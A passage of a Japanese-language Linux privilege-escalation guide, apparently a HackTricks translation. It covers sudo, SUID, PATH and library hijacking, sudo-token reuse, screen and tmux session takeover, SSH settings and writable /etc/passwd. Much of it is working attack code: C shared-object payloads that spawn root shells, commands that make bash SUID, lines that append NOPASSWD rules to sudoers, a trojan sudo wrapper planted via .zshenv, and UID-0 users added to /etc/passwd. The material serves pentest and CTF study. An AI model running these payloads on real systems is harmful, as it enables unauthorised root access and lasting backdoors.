特定の sudo ルールが環境変数を保持する場合、Terraform の変数は `TF_VAR_<name>` 環境変数で指定できます。source-symlink の **読み取り** にも、リンクをたどり、保護された結果を呼び出し元が読み取り可能な宛先にコピーする provider が必要です。destination-symlink への **書き込み** には別途、呼び出し元が制御できる宛先エントリと、書き込み時にリンクをたどる特権 provider が必要です。後で実行されるスケジュール済みジョブは、起こりうる結果の一例にすぎません。いずれかの方法を試す前に、`sudo -l`、`stat`、`readlink` などの読み取り専用コマンドで、正確な sudo 許可、関連する `.tf` ファイル、選択された CLI config、パスの所有者を確認してください。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような脆弱な字句検証では、symlink は解決されません:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraformはシンボリックリンクを解決し、実際の`/root/root.txt`を攻撃者が読み取れる宛先にコピーします。同じ方法を使って、特権パスへの**書き込み**も可能です。たとえば、プロバイダーの宛先パスが`/etc/cron.d/`内を指すように、あらかじめ宛先のシンボリックリンクを作成します。

### requiretty / !requiretty

古いディストリビューションの一部では、sudoに`requiretty`を設定して、対話型TTYからのみ実行できるようにしている場合があります。`!requiretty`が設定されている場合（またはオプションが設定されていない場合）、reverse shell、cron job、スクリプトなどの非対話型コンテキストからsudoを実行できます。

```bash
Defaults !requiretty
```

これはそれ自体が直接的な脆弱性ではありませんが、フルPTYを必要とせずにsudoルールを悪用できる状況を広げます。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` に `env_keep+=PATH` が表示される場合、または `secure_path` に攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）が含まれる場合、sudoで許可された対象内の修飾されていない外部コマンドが、別のコマンドで置き換えられる可能性があります。<sup>[[3]](#references)</sup> 有効な `secure_path` が設定されていない場合も、sudo環境で呼び出し元が制御する `PATH` が保持されている**場合に限り**確認が必要です。設定がないだけでは、保持されている証拠にはなりません。許可されたスクリプトは実行せずに読み、その後、正確なRunAsと引数のルール、有効なコマンド検索パス、およびコマンド名を含む、検索順が先で書き込み可能かつアクセス可能なディレクトリを確認してください。認証、`NOEXEC`、シェル組み込みコマンド、絶対パスの指定によって結果が変わる場合があります。

- 要件: コマンドを絶対パスで指定せずに（`free`、`df`、`ps` など）実行するスクリプト/バイナリを起動するsudoルール（多くの場合 `NOPASSWD`）と、検索順が最初になる書き込み可能なPATHエントリ。

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo実行時のパスを利用した回避
**Jump**して他のファイルを読み込んだり、**symlinks**を使用したりします。たとえば、sudoersファイルに次のように記述します: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

**wildcard**が使われている場合（\*）、さらに簡単です:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### command path を指定せずに実行できる Sudo command/SUID binary

**sudo permission** が単一のコマンドに対して **path を指定せずに**与えられている場合（例: _hacker10 ALL= (root) less_）、PATH 変数を変更することで悪用できます。

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

この technique は、**suid** binary が**パスを指定せずに別の command を実行する場合にも利用できます（奇妙な SUID binary の内容は必ず** _**strings**_ **で確認してください）**。

[実行する payload の例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### command path を指定する SUID binary

**suid** binary が**パスを指定して別の command を実行する場合**は、その SUID file が呼び出す command と同じ名前の**関数を export** してみてください。

たとえば、SUID binary が _**/usr/sbin/service apache2 start**_ を呼び出す場合は、関数を作成して export してみてください。

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

その後、suid バイナリを呼び出すと、この関数が実行されます

### カスタム SUID copy wrapper

source パスと destination パスを受け取る root 所有の SUID utility は、2 つの異なる信頼境界を越える可能性があります。どちらかの引数から shell コマンドを組み立てる場合（たとえば、構築した `cp` コマンドを `system()` に渡す場合）、shell metacharacter によって、実効権限で別のコマンドが実行される可能性があります。shell を介さず安全に `cp` を呼び出していても、destination に制限がなければ、`/etc/passwd` などのファイルへ任意の権限付き書き込みができる可能性があります。wrapper の引数処理、実効 UID の動作、destination の制限、コピーされるファイルの内容を呼び出し側が制御できるかを確認してください。一般的な `cp` のエラーや SUID bit の存在だけでは、どちらの経路についても証明にはなりません。手動テストを行う前に、バイナリと権限を受動的に列挙してください。

### SUID wrapper によって実行される書き込み可能な script

よくあるカスタムアプリの設定ミスは、root 所有の SUID バイナリ wrapper が script を実行する一方で、その script は低権限ユーザーから書き込み可能になっていることです。

典型的なパターン:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh` が書き込み可能であれば、payloadコマンドを追記してからSUID wrapperを実行できます:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

簡易チェック:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

この攻撃経路は、`/usr/local/bin` に配置された「maintenance」や「backup」のラッパーで特によく見られます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準 C ライブラリ（`libc.so`）を含む他のすべてのライブラリより先に、ローダーが読み込む共有ライブラリ（.so ファイル）を 1 つ以上指定するために使用されます。この処理は、ライブラリのプリロードと呼ばれます。

ただし、システムのセキュリティを維持し、この機能の悪用を防ぐため、特に **suid/sgid** 実行ファイルについて、システムはいくつかの条件を適用します。

- 実ユーザー ID（_ruid_）が実効ユーザー ID（_euid_）と一致しない実行ファイルでは、ローダーは **LD_PRELOAD** を無視します。
- suid/sgid が設定された実行ファイルでは、標準パスにあり、かつ suid/sgid が設定されているライブラリのみがプリロードされます。

`sudo` でコマンドを実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という記述が含まれている場合、権限昇格が可能になることがあります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持されて認識されるため、昇格した権限で任意のコードが実行される可能性があります。<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

**/tmp/pe.c** として保存する

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

次に、以下を使って**コンパイルします**：

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

最後に、実行中に**権限昇格**する

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合、ライブラリの検索先となるパスを制御できるため、同様の privesc を悪用できます。

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

不自然に見える **SUID** 権限のバイナリに遭遇した場合、**.so** ファイルが正しく読み込まれているか確認するのが有効です。これは次のコマンドを実行して確認できます。<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

たとえば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、exploitできる可能性があります。

これをexploitするには、_"/path/to/.config/libcalc.c"_ などのCファイルを作成し、次のコードを記述します。

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

このコードは、コンパイルして実行すると、ファイルの権限を操作し、昇格した権限でシェルを実行して権限昇格を行います。

上記のCファイルを共有オブジェクト（.so）ファイルにコンパイルします。

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

最後に、影響を受けるSUIDバイナリを実行するとexploitがトリガーされ、システムが侵害される可能性があります。

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

書き込み可能なフォルダからライブラリを読み込むSUIDバイナリが見つかったので、そのフォルダに必要な名前でライブラリを作成しましょう。

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

次のようなエラーが発生した場合は、

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

つまり、生成したライブラリには `a_function_name` という関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリをまとめたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに**引数しか注入できない**場合を対象とした同様のリストです。

このプロジェクトでは、制限された shell から抜け出す、権限を昇格または維持する、ファイルを転送する、bind shell や reverse shell を起動する、その他の post-exploitation 作業を容易にするといった目的で悪用できる、Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合は、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、sudo ルールの悪用方法が見つかるか確認できます。

### Sudo トークンの再利用

**sudo access** はあるもののパスワードがない場合、sudo コマンドが実行されるのを待ってからセッショントークンを乗っ取ることで、権限を昇格できます。<sup>[[18]](#references)</sup>

権限昇格に必要な条件:

- すでにユーザー "_sampleuser_" として shell を取得している
- "_sampleuser_" が**直近 15 分以内に `sudo` を使って**何かを実行している（デフォルトでは sudo トークンの有効期間は 15 分で、その間はパスワードを入力せずに `sudo` を使えます）
- `cat /proc/sys/kernel/yama/ptrace_scope` の値が 0
- `gdb` が利用できる（アップロードしてもかまいません）

（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を編集して `kernel.yama.ptrace_scope = 0` に設定すると、一時的に `ptrace_scope` を有効にできます）

これらの条件をすべて満たしている場合、[**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) を使って**権限を昇格できます**。

- **最初の exploit**（`exploit.sh`）は、_/tmp_ に `activate_sudo_token` バイナリを作成します。これを使って**セッション内で sudo トークンを有効化**できます（自動的に root shell が取得できるわけではないので、`sudo su` を実行してください）:

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **2つ目のexploit**（`exploit_v2.sh`）は、_ /tmp_ に **root所有でsetuidが設定された** shシェルを作成します。

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **3つ目の exploit** (`exploit_v3.sh`) は、sudo トークンを無期限にし、すべてのユーザーが sudo を使用できるようにする **sudoers ファイルを作成します**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

フォルダー内のファイル、またはフォルダー自体に**書き込み権限**があれば、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って、ユーザーと PID を指定した sudo token を**作成**できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 のシェルを利用できる場合、パスワードを知らなくても、次の操作で **sudo 権限を取得**できます。

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、`sudo` を使用できるユーザーとその使用方法を設定します。これらのファイルは**デフォルトでは、root ユーザーと root グループのみが読み取り可能です**。\
**このファイルを**読み取り**できれば、興味深い情報を**取得**できる可能性があります。また、いずれかのファイルに**書き込み**できれば、**権限昇格**が可能になります。

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

書き込みが可能なら、この権限を悪用できます。

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

これらの権限を悪用するもう1つの方法:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD には `sudo` バイナリの代替として `doas` などがあるため、`/etc/doas.conf` の設定を確認してください。

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

doasでエディタやインタープリターの使用が許可されている場合は、GTFOBins形式のエスケープ方法を確認します。

```bash
doas vim
:!/bin/sh
```

root 権限で実行可能な `doas` ルールが元の Python ベースの `dstat` に適用される場合は、プラグインの検索パスも確認する価値があります。[マニュアル](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1)と[ソース](https://github.com/dstat-real/dstat/blob/master/dstat)には、`dstat_*.py` プラグインの配置先として `/usr/share/dstat/` と `/usr/local/share/dstat/` が挙げられています。現在のユーザーが、インストール済みビルドで実際に使われる場所に対して書き込み権限と検索権限を持つ場合、選択したプラグインが `doas` の RunAs ID で実行される可能性があります。有効なルール、そのビルドでのプラグイン検索動作、ディレクトリと親ディレクトリの権限または ACL、呼び出し元がプラグインを選択できるかを確認してください。`dstat` のルールや書き込み可能なディレクトリだけでは、あくまで調査の手掛かりにすぎません。他の `dstat` 実装では異なるプラグインシステムが使われることがあります。プラグインを読み込まず、メタデータを受動的に調査してください。

### Sudo Hijacking

あるユーザーが通常、マシンに接続して `sudo` を使って権限を昇格することが分かっていて、そのユーザーのコンテキストでシェルを取得できた場合、root としてコードを実行してからユーザーのコマンドを実行する、新しい sudo 実行ファイルを作成できます。次に、ユーザーのコンテキストで `$PATH` を変更し（たとえば `.bash_profile` に新しいパスを追加する）、ユーザーが sudo を実行したときに、作成した sudo 実行ファイルが実行されるようにします。

ユーザーが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために別のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にも別の例があります。

または、次のようなものを実行します。

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## 共有ライブラリ

### ld.so

`/etc/ld.so.conf` ファイルは、**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは、**ライブラリの検索先となる他のフォルダ**を示します。たとえば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**これは、システムが `/usr/local/lib` 内でライブラリを検索することを意味します**。

何らかの理由で、**ユーザーが** `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルで指定されたフォルダに書き込み権限を持っている場合、権限昇格が可能になることがあります。\
以下のページで、**この設定ミスを悪用する方法**を確認してください:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

libを`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されているため、この場所にあるlibがプログラムによって使用されます。

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

次に、以下を使って `/var/tmp` に悪意のあるライブラリを作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilitiesは、**プロセスに付与できるroot権限の一部**を提供します。これにより、rootの**権限が小さく独立した単位に分割**されます。これらの各単位は、個別にプロセスへ付与できます。この方法では権限の全体が縮小され、悪用のリスクが低減します。\
capabilitiesとその悪用方法について**詳しく知る**には、以下のページを参照してください。


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## ディレクトリの権限

ディレクトリでは、**「実行」ビット**は、該当するユーザーがフォルダーに「**cd**」できることを意味します。\
**「読み取り」ビット**はユーザーが**ファイル**を一覧表示できることを意味し、**「書き込み」ビット**は**ファイル**を削除および新規作成できることを意味します。

## ACLs

Access Control Lists (ACLs)は、従来のugo/rwx権限を**上書きできる**、任意アクセス制御の第2層です。これらの権限により、所有者でもグループの一員でもない特定のユーザーに権限を許可または拒否できるため、ファイルやディレクトリへのアクセス制御が強化されます。このレベルの**細分性により、より正確なアクセス管理が可能になります**。詳しくは[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。<sup>[[19]](#references)</sup>

ファイルに対する読み取りおよび書き込み権限をユーザー「kali」に**付与**します。

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**取得** システムから特定の ACL が設定されたファイル:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-in に隠された ACL backdoor

よくある設定ミスは、`/etc/sudoers.d/` 内の root 所有で mode `440` のファイルが、ACL によって低権限ユーザーにも書き込みを許可していることです。

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-` のようなものが見られる場合、制限的なモードビットにもかかわらず、そのユーザーは sudo ルールを追記できます。

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

これは影響の大きい ACL persistence/privesc 経路です。`ls -l` だけのレビューでは見落としやすいためです。

## 開いているシェルセッション

ユーザー間の GNU Screen アクセスは、バージョンだけではなく、**実行中のセッションの設定と ACL** に依存します。[GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) によると、multiuser サポートを有効にしてビルドする必要があり、`multiuser on` と `acladd`、または適切な `aclchg` による許可があれば、別のユーザーがアタッチできます。[The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) は、ユーザー間のセッション検索に setuid-root も必要としています。root 所有のソケットが見えることや、SUID の `screen` バイナリがあることだけでは、アタッチ可能な root シェルが存在するとは判断できません。エスカレーションと見なす前に、実行中のセッションで multiuser が有効であること、現在のユーザーに実効的な入力権限またはコマンド実行権限があること、そしてそのセッション内のシェルが特権所有者として動作していることを確認してください。

### screen sessions hijacking

**screen セッションを一覧表示する**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - ソケットの場所（一部のシステムでは、一方が他方のシンボリックリンクとして公開されています）：ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**セッションに接続する**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux セッションの hijacking

これは**古い tmux バージョン**での問題でした。非特権ユーザーとして、root が作成した tmux (v2.1) セッションを hijack することはできませんでした。

**tmux セッションを一覧表示**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![ソケットの場所（システムによっては、一方がもう一方のシンボリックリンクとして公開される） - tmux セッションの hijacking: tmux -S /tmp/dev sess ls このソケットを使って一覧表示できます。このソケットで tmux セッションを開始できます...](<../../images/image (837).png>)

**セッションに接続する**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

HTB の **Valentine box** を例として確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

脆弱性があった歴史的な期間に、影響を受ける Debian または派生版の OpenSSL ビルドで生成された鍵は、予測可能な乱数を使っている可能性があります。ホストの現在のディストリビューションや修正済み OpenSSL のバージョンだけでは、古い鍵がどのように生成されたかは判断できません。**個々の鍵**を、適切な過去のブラックリストおよびその由来と照合してください。Debian の [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) では公開鍵と `authorized_keys` の確認方法が説明されており、[DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) には OpenSSL の修正が記録されています。特権アカウントの `authorized_keys` にエントリがあっても、対応する秘密鍵を入手でき、かつ有効な SSH ポリシーでそのアカウントへの鍵の使用が許可されている場合に限り、権限昇格の手掛かりになります。脆弱な **ホスト**鍵そのものは、ログイン認証情報ではありません。侵害された鍵を置き換え、古い鍵の認証設定を削除してください。

### SSH の興味深い設定値

- **PasswordAuthentication:** パスワード認証を許可するかどうかを指定します。upstream の OpenSSH のデフォルトは `yes` ですが、ディストリビューションの設定で上書きされる場合があります。
- **PubkeyAuthentication:** 公開鍵認証を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、空のパスワード文字列を持つアカウントへのログインをサーバーが許可するかどうかを指定します。デフォルトは `no` です。

### ログイン制御ファイル

これらのファイルは、ログインできるユーザーやログイン方法に影響します。

- **`/etc/nologin`**: 存在する場合、root 以外のログインをブロックし、メッセージを表示します。
- **`/etc/securetty`**: root がログインできる場所を制限します（TTY の許可リスト）。
- **`/etc/motd`**: ログイン後に表示されるバナーです（環境やメンテナンスの詳細が漏れる可能性があります）。

### PermitRootLogin

ssh を使った root のログインを許可するかどうかを指定します。upstream の OpenSSH のデフォルトは `prohibit-password` ですが、ディストリビューションの設定で上書きされる場合があります。指定できる値は次のとおりです。

- `yes`: root はパスワードと秘密鍵を使ってログインできます
- `without-password` または `prohibit-password`: root は秘密鍵を使った場合にのみログインできます
- `forced-commands-only`: root は秘密鍵を使い、コマンドオプションが指定されている場合にのみログインできます
- `no` : ログイン不可

### 信頼された SSH ユーザー証明書認証局

`TrustedUserCAKeys` は、sshd が**ユーザー**証明書への署名に使用するものとして信頼する公開鍵を指定します。対応する秘密 CA 鍵を低権限ユーザーが読み取れる場合は、誰が証明書を取得できるか、また、どのアカウントのプリンシパルとして認証できるかを確認してください。`AuthorizedPrincipalsFile` または `AuthorizedPrincipalsCommand` で受け入れる名前を制限できます。どちらも設定されていない場合、証明書には対象アカウント名が含まれている必要があります。`PermitRootLogin prohibit-password` は root のパスワード認証をブロックしますが、証明書認証は許可する場合があります。鍵のパスが露出しているだけではアクセスできる証明にはなりません。公開鍵と秘密鍵のペア、有効な `Match` ルール、アカウントポリシー、鍵のパスフレーズ、失効状態、受け入れ可能な署名アルゴリズムを確認してください。列挙結果に秘密鍵のバイト列を含めないでください。[OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) を参照してください。

権限委譲ルールにより、現在のユーザーが鍵の所有者の権限で制限のない[証明書署名コマンド（`ssh-keygen -s` など）](https://man.openbsd.org/ssh-keygen#-s)を実行できる場合、秘密 CA 鍵を読み取れなくても、その鍵を利用できる可能性があります。許可されたコマンドと引数を正確に確認し、署名者アカウントが鍵にアクセスできるか、有効な sshd 設定で信頼されている公開 CA はどれか、対象アカウントで受け入れられるプリンシパルは何か、証明書の有効期間、およびそのアカウントのログインポリシーと照合してください。署名コマンドの委譲や信頼された CA ファイルだけでは、別のアカウントにアクセスできる証明にはなりません。受動的な列挙中にテスト証明書へ署名しないでください。

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。ホームディレクトリに置き換えられる `%h` などのトークンを含めることができます。**絶対パス（`/` で始まるパス）**または**ユーザーのホームディレクトリからの相対パス**を指定できます。例：

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

その設定により、ユーザー「**testusername**」の **private** key でログインしようとすると、ssh はその key の public key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと照合します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding を使うと、サーバー上に（passphrase のない！）key を置いたままにせず、**ローカルの SSH keys を使えます**。つまり、ssh で **あるホストに接続し**、そこから **最初のホストにある** **key を使って** **別のホストへ接続**できます。

このオプションを `$HOME/.ssh.config` に次のように設定します。

```
Host example.com
  ForwardAgent yes
```

`Host` が毎回 `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストが鍵にアクセスできることに注意してください（これはセキュリティ上の問題です）。

`/etc/ssh_config` ファイルは、この**オプション**を**上書き**し、この設定を許可または拒否できます。\
`/etc/sshd_config` ファイルでは、キーワード `AllowAgentForwarding` を使って ssh-agent forwarding を**許可**または**拒否**できます（デフォルトは許可）。

環境内で Forward Agent が設定されている場合は、以下のページを確認してください。**権限昇格に悪用できる可能性があります**。


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### Profile ファイル

`/etc/profile` ファイルと `/etc/profile.d/` 配下のファイルは、ユーザーが新しい shell を起動したときに実行される**スクリプト**です。そのため、これらのいずれかに**書き込みまたは変更ができれば、権限昇格できます**。

```bash
ls -l /etc/profile /etc/profile.d/
```

奇妙なプロファイルスクリプトが見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadowファイル

OSによっては、`/etc/passwd`ファイルや`/etc/shadow`ファイルの名前が異なっていたり、バックアップが存在したりする場合があります。そのため、これらのファイルを**すべて見つけ**、**読み取り可能か確認**して、ファイル内に**ハッシュがあるか**調べることをおすすめします。

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

場合によっては、`/etc/passwd`（または同等のファイル）内に**パスワードハッシュ**が見つかることがあります。

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### 書き込み可能な /etc/passwd

まず、以下のいずれかのコマンドでパスワードを生成します。

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

次にユーザー `hacker` を追加し、生成されたパスワードを設定します。

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `hacker:hacker` を使って `su` コマンドを実行できます。

または、以下の行を使って、パスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

